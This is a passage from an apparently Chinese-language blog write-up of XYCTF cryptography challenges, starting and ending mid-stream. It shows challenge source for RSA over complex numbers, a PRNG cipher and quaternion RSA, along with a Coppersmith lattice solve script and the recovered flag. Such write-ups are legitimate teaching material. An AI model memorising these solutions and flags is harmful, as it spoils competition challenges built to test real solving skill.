class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> [self.re, self.im]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = Complex(getRandomRange(<span class="number">1</span>, n), getRandomRange(<span class="number">1</span>, n))</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = complex_pow(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mh = <span class="subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c.tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line"><span class="string">mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]</span></span><br><span class="line"><span class="string">C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]</span></span><br><span class="line"><span class="string">enc = b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>熟悉的复数，熟悉的味道（还记得去年的两道复数.泪目了</p>
<p>前半部分就是定义了一下复数的运算，后半部分是一个已知m高位的RSA。已知m高位很明显要打copper，那这道题是复数域，咋办呢。那就分别对实部和虚部打copper，也就是二元cooper啦。</p>
<p>先贴个二元copper的板子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

<p>众所周知，我们打copper需要一个式子，这里我们就根据complex_pow(c, exp, n)这个对应的式子来打。(顺带一提.tolist()会返回包含该复数实部和虚部的一个列表)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">H1, H2 = mh</span><br><span class="line">R.&lt;a, b&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">m = Complex(H1+a, H2+b)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c0, c1 = complex_pow(m, e, n).tolist()</span><br><span class="line">f = c0+c1-C[<span class="number">0</span>]-C[<span class="number">1</span>]</span><br><span class="line">a, b = Small_roots(f, bounds=(<span class="number">2</span>**<span class="number">128</span>, <span class="number">2</span>**<span class="number">128</span>), m=<span class="number">1</span>, d=<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">m = Complex(H1+a, H2+b)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实就是普通的m高位的思路，对实部虚部分别打就行。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sage 10.5</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re == c.re <span class="keyword">and</span> self.im == c.im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &gt;&gt; m, self.im &gt;&gt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &lt;&lt; m, self.im &lt;&lt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> [self.re, self.im]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = <span class="number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line">mh = [<span class="number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span>, <span class="number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span>]</span><br><span class="line">C = [<span class="number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span>, <span class="number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span>]</span><br><span class="line">enc = <span class="string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line">H1, H2 = mh</span><br><span class="line">R.&lt;a, b&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">m = Complex(H1+a, H2+b)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c0, c1 = complex_pow(m, e, n).tolist()</span><br><span class="line"><span class="built_in">print</span>(c0)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line">f = c0+c1-C[<span class="number">0</span>]-C[<span class="number">1</span>]</span><br><span class="line">a, b = Small_roots(f, bounds=(<span class="number">2</span>**<span class="number">128</span>, <span class="number">2</span>**<span class="number">128</span>), m=<span class="number">1</span>, d=<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">m = Complex(H1+a, H2+b)</span><br><span class="line"><span class="built_in">print</span>(ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc))</span><br><span class="line"><span class="comment"># XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="2-Reed"><a href="#2-Reed" class="headerlink" title="2,Reed"></a>2,Reed</h1><p>题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag.rstrip(<span class="string">&#x27;&#125;&#x27;</span>).lstrip(<span class="string">&#x27;XYCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> table <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">r = random.Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.a = <span class="number">1145140</span></span><br><span class="line">        self.b = <span class="number">19198100</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        x = random.randint(self.a, self.b)</span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self, k</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            x = self.<span class="built_in">next</span>()</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, a, b</span>):</span><br><span class="line">    c = [(a * table.index(m) + b) % <span class="number">19198111</span> <span class="keyword">for</span> m <span class="keyword">in</span> msg]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me seed: &#x27;</span>))</span><br><span class="line">prng = PRNG(seed)</span><br><span class="line">a = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">b = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">enc = encrypt(flag, a, b)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure>

<p>AI一把梭XD</p>
<h1 id="3-复复复复数"><a href="#3-复复复复数" class="headerlink" title="3,复复复复数"></a>3,复复复复数</h1><p>题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):</span><br><span class="line">        self.value = value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(self.value[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.value[<span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(self.value,x.value)])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):</span><br><span class="line">        a = self.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]</span><br><span class="line">        b = self.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]</span><br><span class="line">        c = self.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]</span><br><span class="line">        d = self.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> self.value])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):</span><br><span class="line">        tmp = ComComplex(self.value)</span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">while</span> x:</span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">                a *= tmp</span><br><span class="line">            tmp *= tmp</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                a %= n</span><br><span class="line">                tmp %= n</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">r = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line"></span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(hint) == <span class="number">20</span></span><br><span class="line">hints = ComComplex([bytes_to_long(hint[i:i+<span class="number">5</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>,<span class="number">5</span>)])</span><br><span class="line">keys = ComComplex([<span class="number">0</span>, p, q, r])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint =&#x27;</span>,hints)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift =&#x27;</span>,hints*keys%P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;P =&#x27;</span>,P)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65547</span></span><br><span class="line">m = ComComplex([bytes_to_long(flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>)])</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">hint = 375413371936+452903063925i+418564633198j+452841062207k</span></span><br><span class="line"><span class="string">gift = 8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729+20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171i+22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868j+40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863k</span></span><br><span class="line"><span class="string">P = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line"><span class="string">n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line"><span class="string">c = 212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103+24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825i+45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125j+96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385k</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是复数，但不是一般的复数，看一下前面的class部分发现是一个四元复数，这点其实解hint也能得到。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">numbers = [<span class="number">375413371936</span>, <span class="number">452903063925</span>, <span class="number">418564633198</span>, <span class="number">452841062207</span>]</span><br><span class="line">byte_arrays = []</span><br><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> numbers:</span><br><span class="line">    byte_array = number.to_bytes(<span class="number">5</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    byte_arrays.append(byte_array)</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span>.join(byte_arrays)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;What is Quaternion??&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后就可以先把p，q，r分别算出来。这里的重点是四元数的乘法，也就是这一段</p>
